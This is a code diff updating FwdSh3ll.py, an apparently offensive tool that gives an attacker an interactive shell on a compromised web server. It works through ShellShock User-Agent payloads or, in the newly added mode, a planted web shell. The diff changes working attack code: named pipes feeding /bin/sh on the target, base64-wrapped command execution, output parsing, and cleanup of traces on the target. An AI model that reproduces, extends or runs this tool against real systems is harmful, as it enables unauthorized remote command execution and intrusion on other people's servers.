@@ -25,13 +25,14 @@ damage caused by this tool.
 
 import requests
 import threading
+import random
+import string
 import re
 import sys
 
 from termcolor import colored, cprint
 from importlib import import_module
 from base64 import b64encode
-from random import randrange
 from time import sleep
 from os import listdir
 
@@ -74,6 +75,9 @@ python3 FwdSh3ll.py [-h]
 '''
 
 
+PATH = '/tmp'
+
+
 class ForwardShell:
 	def __init__(self, url, proxy, payloadName, genPayload, interval=1.3):
 		self._url = url
@@ -82,13 +86,13 @@ class ForwardShell:
 		self._genPayload = genPayload
 		self._interval = interval
 
-		self._session = randrange(10000, 99999)
-		self._stdin = f'/dev/shm/fwdshin.{self._session}'
-		self._stdout = f'/dev/shm/fwdshout.{self._session}'
+		self._session = random.randrange(10000, 99999)
+		self._stdin = f'{PATH}/fwdshin.{self._session}'
+		self._stdout = f'{PATH}/fwdshout.{self._session}'
 		cprint(f'[*] Session ID: {self._session}', 'green')
 
 		cprint('[*] Setting up forward shell on target', 'green')
-		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh > {self._stdout} 2>&1'
+		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
 		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxy, self._payloadName, self._genPayload, timeout=0.5)
 
 		cprint('[*] Setting up read thread', 'green')
@@ -106,7 +110,7 @@ class ForwardShell:
 			if result:
 				with self._lock:
 					print(result)
-				clearOutput = f'echo -n "" > {self._stdout} > /dev/null'
+				clearOutput = f'echo -n "" > {self._stdout}'
 				ForwardShell.runRawCmd(clearOutput, self._url, self._proxy, self._payloadName, self._genPayload)
 			sleep(self._interval)
 
@@ -118,6 +122,10 @@ class ForwardShell:
 		elif payloadName == 'ShellShock':
 			payload = genPayload(cmd)
 			headers = {'User-Agent': payload}
+		elif payloadName == 'WebShell':
+			delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+			url += f'echo {delim};' + cmd + f';echo {delim}'
+			headers = {'User-Agent': 'Mozilla/5.0'}
 
 		page = b''
 		try:
@@ -143,14 +151,22 @@ class ForwardShell:
 			cprint(f'[!] Exception caught: {str(e)}', 'yellow')
 			return None
 
-		return page.decode('utf-8')
+		page = page.decode('utf-8')
+
+		if payloadName == 'WebShell':
+			try:
+				page = re.search(rf'{delim}(.*?){delim}', page, re.DOTALL).group(1)
+			except AttributeError:
+				return None
+
+		return page
 
 	def writeCmd(self, cmd, namedPipes=True):
 		b64Cmd = b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
 		if namedPipes:
-			unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self._stdin}'
+			unwrapAndExec = f'echo {b64Cmd} | base64 -d > {self._stdin}'
 		else:
-			unwrapAndExec = f'base64 -d <<< {b64Cmd} | /bin/sh > /dev/null'
+			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null'
 		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
 		sleep(self._interval * 1.2)
 
@@ -262,8 +278,8 @@ def main():
 			except KeyboardInterrupt:
 				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
 				del sh
-				b64Cmd = b64encode('rm -f /dev/shm/fwdshin.* /dev/shm/fwdshout.*\n'.encode('utf-8')).decode('utf-8')
-				ForwardShell.runRawCmd(f'base64 -d <<< {b64Cmd} | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
+				b64Cmd = b64encode(f'rm -f {PATH}/fwdshin.* {PATH}/fwdshout.*\n'.encode('utf-8')).decode('utf-8')
+				ForwardShell.runRawCmd(f'echo {b64Cmd} | base64 -d | /bin/sh > /dev/null', url, proxy, payloadName, payloadModule.genPayload)
 				break
 
 
